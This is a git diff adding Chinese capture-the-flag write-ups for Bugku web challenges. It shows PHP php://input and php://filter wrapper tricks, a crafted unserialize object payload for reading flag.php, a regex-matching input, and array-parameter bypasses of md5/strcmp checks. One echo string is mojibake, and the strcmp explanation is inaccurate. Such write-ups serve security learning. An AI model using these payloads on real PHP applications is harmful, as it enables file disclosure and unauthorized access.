@@ -479,3 +479,117 @@ for w in range(n):#高和宽一起爆破
 
   解密后就看到有点复杂的逻辑，但是不用管它。直接发现有个f4l2a3g.txt文件，访问后拿到flag
   ![never_give_up](../imgs/Bugku/Web/gnome-shell-screenshot-ZKZA3Z.png)
+
+25. welcome to bugkuctf
+
+  有意思的一道题，介绍了CTF题目中常用两个的PHP伪协议(为什么总是php??)。
+
+  ![welcome_to_bugkuctf](../imgs/Bugku/Web/gnome-shell-screenshot-XMXG4Z.png)
+
+  可以看到页面中给了这样的提示：
+  ```
+  <!--  
+  $user = $_GET["txt"];  
+  $file = $_GET["file"];  
+  $pass = $_GET["password"];  
+
+  if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
+      echo "hello admin!<br>";  
+      include($file); //hint.php  
+      }else{  
+        echo "you are not admin ! ";  
+      }  
+  -->
+  ```
+  提示内容很简单，if判断语句是要保证两个条件同时满足：一是URL中传递的txt值不能为空。二是我一开始认为txt值应该是一个文件名称，这样的话file_get_contents函数读取txt名称的文件，而文件中内容恰好是'welcome to the bugkuctf'。
+
+  后来发现我对第二个条件的认识是错误的。我用dirb扫描没有找到其他文件的存在，也就是说不存在可以通过file_get_contents函数读取的文件。
+
+  其实file_get_contents不仅仅可以读取文件，还可以通过一个伪协议file_get_contents(php://input)读取post里面的内容。
+
+  ![welcome_to_bugkuctf](../imgs/Bugku/Web/gnome-shell-screenshot-Q0PY3Z.png)
+
+  可以看到返回内容已经做出改变，if判断里面的条件我们已经满足(虽然这里还有一个小问题，就是现在页面返回的内容是hello friend，和注释中给我们的you are not admin不一致。说明index.php文件还有内容是注释里面没有说明的)。现在来看第二个要求，就是`include($file)`这句，他是要求包含hint.php文件。但如果只是构造file=hint.php不会直接给出hint.php源文件(为什么？),需要利用php://filter伪协议将hint.php文件内容转化为base64(也是CTF题目中最常用的方法)。
+
+  于是构造`file=php://filter/read=convert.base64-encode/resource=hint.php`
+
+  ![welcome_to_bugkuctf](../imgs/Bugku/Web/gnome-shell-screenshot-43O33Z.png)
+
+  解码后：
+  ```
+  /*hint.php*/
+  <?php  
+
+  class Flag{//flag.php
+      public $file;  
+      public function __tostring(){  
+          if(isset($this->file)){  
+              echo file_get_contents($this->file);
+			        echo "<br>";
+		          return ("good");
+                 }  
+               }  
+             }  
+  ?>    
+  ```
+  还有点复杂的感觉。以上代码告知了这么一个情况:有个flag.php文件，里面有一个Flag类，`__tostring`方法说明当打印Flag实例的时候，会输出Flag实例中的$file变量值。
+
+  先尝试直接打印flag内容，发现不行
+  ![welcome_to_bugkuctf](../imgs/Bugku/Web/gnome-shell-screenshot-33EA4Z.png)
+
+  还记得之前说过index.php文件还有内容我们没有发现吗，构造`file=php://filter/read=convert.base64-encode/resource=index.php`查看一下index.php文件内容。
+  ```
+  <?php  
+  $txt = $_GET["txt"];  
+  $file = $_GET["file"];  
+  $password = $_GET["password"];  
+
+  if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
+      echo "hello friend!<br>";  
+      if(preg_match("/flag/",$file)){
+		      echo "ä¸è½ç°å¨å°±ç»ä½ flagå¦";
+          exit();  
+        }else{  
+            include($file);   
+            $password = unserialize($password);  
+            echo $password;  
+          }  
+          }else{  
+            echo "you are not the number of bugku ! ";  
+          }  
+  ?>
+  ```
+  很明显，第二个if函数说明了file参数不能包含flag字符。结合hint.php文件中的内容说明一下，$password应该是Flag实例序列化后的字符串，因此反序列化$password(就是将已经被序列化为$password字符串的对象复原)后，echo $password就会调用Flag类中的__toString方法，而__toString方法是打印类中的file属性值。目前就是需要打印出flag.php页面，所以我们把实例的file值等于'flag.php'
+
+  第一步，构造Flag类，Flag类的file属性等于flag.php，并将其实例化
+  ![welcome_to_bugkuctf](../imgs/Bugku/Web/gnome-shell-screenshot-J0J73Z.png)
+
+  第二步，在index.php页面构造url为`?txt=php://input&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`
+
+  ![welcome_to_bugkuctf](../imgs/Bugku/Web/gnome-shell-screenshot-TAID4Z.png)
+
+  需要注意的是此时不需要对hint.php文件进行base64编码。因为编码的目的是为了展示页面源代码，现在的目的不用展示，是把Flag类的定义进行引用。
+
+26. 字符？正则？
+
+  又到了一年一度的“为什么我怎么总是学不会正则表达式？？为什么一学就忘”的无能狂怒时间。
+  ![正则](../imgs/Bugku/Web/gnome-shell-screenshot-KUJ33Z.png)
+
+  以前做过这道题，但是好像做错了。
+
+  一个个来吧。
+
+  1. 首先看到整个结构一头一尾是被`/格式/i`包裹的，这个i就代表了中间格式内容不区分大小写。
+  2. key.* 前面key就是要求构造时候要以key开头，句号`.`代表除了换行符以外任意1个字符的匹配，星号`*`代表匹配0次或多次任意字符。所以构造`?id=keyaakey`
+  3. .{4,7}key 前面的部分`.{4,7}`代表对`.`重复匹配4~7次。目前是`?id=keyaakeybbbbkey`
+  4. :\\/.\\/(.* key) `\/`部分是指匹配`/`，`\`是用于转义。所以当前构造`?id=keyaakeybbbbkey:/c/dkey`
+  5. [a-z][[:punct:]] 第一个是任意a-z英文字母，后面框框是指任意符号。最后构造的结果是：`?id=keyaakeybbbbkey:/c/dkeye-`，得到flag
+
+27. 前女友
+
+  根据源代码的提示看到code.txt内容。
+  ![正则](../imgs/Bugku/Web/gnome-shell-screenshot-SE6C4Z.png)
+
+  这个一看就知道是利用md5函数无法计算数组以及strcmp(参数1,参数2)(是比较两个参数字符串长度)中，无法比较数组的特点来构造。构造一下url参数拿到flag.
+
+  `?v1[]=a&v2[]=b&v3[]=c`
